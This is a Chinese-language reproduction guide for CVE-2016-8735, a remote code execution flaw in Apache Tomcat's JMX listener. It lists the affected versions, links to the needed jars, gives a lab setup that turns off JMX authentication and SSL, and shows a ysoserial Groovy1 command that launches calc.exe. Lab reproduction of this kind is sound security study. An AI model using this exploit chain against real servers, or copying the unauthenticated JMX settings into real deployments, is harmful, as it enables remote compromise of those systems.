# CVE-2016-8735

## 介绍
Apache Tomcat Remote Code Execution  
Tomcat引入一些功能导致远程代码注入  
Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法  

## 漏洞影响版本
```
ApacheTomcat 9.0.0.M1 到9.0.0.M11
ApacheTomcat 8.5.0 到8.5.6
ApacheTomcat 8.0.0.RC1 到8.0.38
ApacheTomcat 7.0.0 到7.0.72
ApacheTomcat 6.0.0 到6.0.47
```

## 相关资源下载
ApacheTomcat 8.5.2：  
https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.2/bin/apache-tomcat-8.5.2-windows-x64.zip  
catalina-jmx-remote.jar：  
https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.2/bin/extras/catalina-jmx-remote.jar  
groovy-2.3.9.jar：  
http://central.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar  
ysoserial.jar：  
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar  
Jdk1.7.0_80：  
https://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html （登录才能下载）  

## 环境配置
只测试了win7  
1. 安装jdk，并创建环境变量JAVA_HOME  
2. 解压tomcat，将catalina-jmx-remote.jar、groovy-2.3.9.jar复制到tomcat/lib/下  
3. 修改文件  
    tomcat/bin/catalina.bat 在"ExecuteThe Requested Command"注释的上一行添加
    ```bat
    set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
    ```
    tomcat/conf/server.xml 在listener下添加
    ```xml
    <Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />
    ```

## 漏洞触发
双击tomcat/bin/start.bat 启动tomcat  
执行命令：  
```r
java -cp ysoserial-master-f31677fbc3-1.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 "calc.exe"
```

效果是计算器被打开  


## 参考
1. http://blog.safebuff.com/2016/12/05/Apache-Tomcat-Remote-Code-Execution-CVE-2016-8735/
2. https://www.jianshu.com/p/1581b9b2849b // 这个描述比较准确
3. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8735


---
2018/12/11  
